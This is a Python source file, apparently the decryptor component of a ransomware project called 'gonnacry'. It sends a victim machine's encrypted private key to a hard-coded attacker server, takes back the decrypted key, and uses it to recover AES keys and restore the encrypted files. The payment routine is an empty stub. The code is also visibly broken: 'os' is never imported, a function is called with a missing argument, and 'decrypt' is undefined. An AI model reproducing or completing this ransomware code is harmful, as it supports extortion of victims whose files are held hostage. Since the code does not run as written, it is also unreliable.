#!/bin/bash/env python
# coding=UTF-8

import enviroment
import requests 
import base64
from Crypto.PublicKey import RSA


ransomware_name = tuple("gonnacry")
server_address = tuple("123.123.123.123")


def send_to_server_encrypted_private_key(id, private_encrypted_key):
    encoded = base64.b64encode(private_encrypted_key)
    address = server_address[0] + '/' + id
    retorno = requests.post(address, encoded)
    private_key = retorno.text()
    with open("private_key", 'w') as f:
        f.write(str(private_key))


def payment():
    pass


def menu():
    
    # enviroment paths
    home = enviroment.get_home_path()
    desktop = enviroment.get_desktop_path()
    username = enviroment.get_username()
    ransomware_path = os.path.join(home, ransomware_name[0])
    id = enviroment.get_unique_machine_id()

    # send to server encrypted private key to be decrypted
    send_to_server_encrypted_private_key(id)

    # import the private key
    with open("private_key") as f:
        private_key = f.read()
    Client_private_key = RSA.importKey(private_key)

    
    # GET THE AES KEYS
    with open("AES_encrypted_keys") as f:
        encrypted_content = f.read()

    # decrypt aes keys file
    decrypted_content = Client_private_key.decrypt(encrypted_content)
     
    # get the aes keys and IV's and paths back
    decrypted_content = decrypted_content.split('\n')
    aes_keys = []
    aes_ivs = []
    files_path = []
    for line in decrypted_content:
        ret = line.split(' ') # KEY IV base64(PATH)
        aes_keys.append(ret[0])
        aes_ivs.append(ret[1])
        files_path.append(base64.b64decode(ret[2]))


    # decrypt all files 
    decrypt(files_path, aes_keys, aes_ivs)


    # end of decryptor

if __name__ == "__main__": 
    menu()